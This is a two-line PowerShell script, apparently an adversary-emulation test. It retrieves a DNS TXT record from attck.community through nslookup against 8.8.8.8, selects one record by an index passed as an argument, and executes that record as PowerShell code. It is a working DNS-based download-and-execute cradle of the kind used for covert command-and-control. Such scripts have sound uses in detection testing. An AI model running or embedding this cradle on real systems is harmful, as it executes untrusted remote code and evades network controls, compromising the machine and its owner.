$param=$args[0]
powershell .((nslookup -q=txt attck.community 8.8.8.8)[-$param])